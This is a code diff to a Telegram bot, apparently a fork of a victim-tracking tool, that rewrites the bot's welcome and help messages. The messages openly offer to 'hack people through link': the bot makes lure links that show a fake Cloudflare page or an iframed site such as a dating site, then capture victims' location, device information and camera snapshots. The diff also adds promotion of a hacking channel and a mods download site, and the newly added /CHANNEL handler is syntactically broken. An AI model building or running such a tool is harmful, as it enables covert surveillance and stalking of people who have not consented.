@@ -72,24 +72,18 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `HIE ${msg.chat.first_name} ! , \nAM SHINITA THA HELPER 💗 YOU CAN USE ME TO HACK PEOPLE THROUGH LINK 🔗.\nCAN GATHER INFORMATION LIKE LOCATION , DEVICE INFO & CAMERA SNAP🫰.\n\nTYPE /help FOR MORE INFO & TUTORIAL'S.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
-`);
+bot.sendMessage(chatId,` HIE AWESOME 👍 USER !\n\nFIRST JOIN MY MAIN CHANNEL 🌎 @tcronebhackx 👊\n🤗HOW TO USE ME 🥺, PLEASE WATCH VIDEO BELOW 👇\n\nNOW WATCH THIS VIDEO 👉👈
+\nAFTERWARDS I WILL ASK YOU A URL WHICH WILL BE USED IN IFRAME TO LURE VICTIMS. AFTER RECEIVING 2 URL LINKS YOU MUST CHOOSE 1 TO TRACK PEOPLE.\nCLOUDFLARE LINK : THIS METHOD WILL SHOW A Cloudflare UNDER ATTACK PAGE TO GATHER INFORMATION AND AFTERWARDS VICTIM WILL BE REDIRECTED TO DESTINATIONED.\n\nURL 2 WEBVIEW LINK : THIS WILL SHOW A WEBSITE ( EXAMPLE - BING , DATING SITES ETC ) USING IFRAME TO GATHERING INFORMATION.\n\n⚠️ WARNING ⚠️\n\nSOME SITES MAY NOT WORK UNDER THIS METHOD IF THEY HAVE X-FRAME HEADER PRESENT (EXAMPLE - HTTPS://GOOGLE.COM )./n/n💡MY BEAUTIFUL ❤️ OWNER\n\n📨WHATSAPP - https://wa.me/message/LMYVBIUMYDBDF1\n\n🦞 DOWNLOAD PREMIUM MODS ON - https://woftech.vercel.app`);
 }
-  
-  
+else if(msg.text=="/CHANNEL"){
+bot.sendMessage(chatId,` @tcronebhackx')
+}
 });
 
 bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
